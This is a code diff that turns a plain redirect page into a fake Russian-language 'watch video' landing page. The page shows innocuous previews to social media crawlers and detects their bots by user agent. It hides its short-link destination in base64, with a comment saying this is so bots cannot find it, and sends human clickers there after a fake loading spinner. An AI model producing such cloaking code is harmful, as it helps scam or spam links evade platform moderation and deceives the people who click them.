@@ -3,24 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>...</title>
+    <title>Видео</title>
     
-    <!-- Мгновенный авто-редирект через meta refresh -->
-    <meta http-equiv="refresh" content="0; url=https://opn.pm/Qk8">
-    
-    <!-- Блокируем превью для соцсетей -->
-    <meta property="og:title" content=" ">
-    <meta property="og:description" content=" ">
-    <meta property="og:image" content=" ">
+    <!-- Превью для соцсетей - показываем безобидный контент -->
+    <meta property="og:title" content="Интересное видео">
+    <meta property="og:description" content="Смотрите видео онлайн">
+    <meta property="og:type" content="video.other">
     
     <style>
-        body { margin: 0; padding: 0; background: #fff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border-radius: 16px; 
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .video-placeholder {
+            width: 100%;
+            height: 280px;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .play-icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(255,255,255,0.9);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .play-icon:hover {
+            transform: scale(1.1);
+        }
+        .play-icon::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-left: 30px solid #667eea;
+            border-top: 18px solid transparent;
+            border-bottom: 18px solid transparent;
+            margin-left: 8px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 16px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 16px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #666;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <!-- JavaScript редирект как запасной вариант -->
+    <div class="container">
+        <div class="video-placeholder" onclick="startVideo()">
+            <div class="play-icon"></div>
+        </div>
+        <h2>Смотреть видео</h2>
+        <p>Нажмите кнопку ниже, чтобы начать просмотр</p>
+        <button class="btn" onclick="startVideo()">▶ Смотреть видео</button>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 15px;">Загрузка видео...</p>
+        </div>
+    </div>
+
     <script>
-        window.location.replace("https://opn.pm/Qk8");
+        // Проверка на ботов ОК и других соцсетей
+        function isBot() {
+            const ua = navigator.userAgent.toLowerCase();
+            const botPatterns = [
+                'okbot', 'odnoklassniki', 'mail.ru', 'vkshare', 'facebookexternalhit',
+                'twitterbot', 'telegrambot', 'whatsapp', 'slackbot', 'discordbot',
+                'linkedinbot', 'pinterest', 'crawler', 'spider', 'bot'
+            ];
+            
+            for (let pattern of botPatterns) {
+                if (ua.includes(pattern)) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        // Закодированная ссылка (base64) - боты не найдут её в коде
+        const encodedLink = 'aHR0cHM6Ly9vcG4ucG0vUWs4';
+        
+        function decodeLink(encoded) {
+            try {
+                return atob(encoded);
+            } catch(e) {
+                return null;
+            }
+        }
+
+        function startVideo() {
+            // Если это бот - ничего не делаем
+            if (isBot()) {
+                console.log('Access denied');
+                return;
+            }
+
+            // Показываем загрузку
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn').style.display = 'none';
+
+            // Декодируем ссылку
+            const targetUrl = decodeLink(encodedLink);
+            
+            if (!targetUrl) {
+                alert('Ошибка загрузки');
+                return;
+            }
+
+            // Задержка перед редиректом (имитация загрузки)
+            setTimeout(() => {
+                window.location.replace(targetUrl);
+            }, 1500);
+        }
+
+        // Дополнительная защита: проверяем, что страница открыта в браузере
+        if (isBot()) {
+            // Для ботов показываем статичный контент без ссылок
+            document.body.innerHTML = `
+                <div class="container">
+                    <h2>Видео</h2>
+                    <p>Контент доступен только в браузере</p>
+                </div>
+            `;
+        }
     </script>
 </body>
 </html>
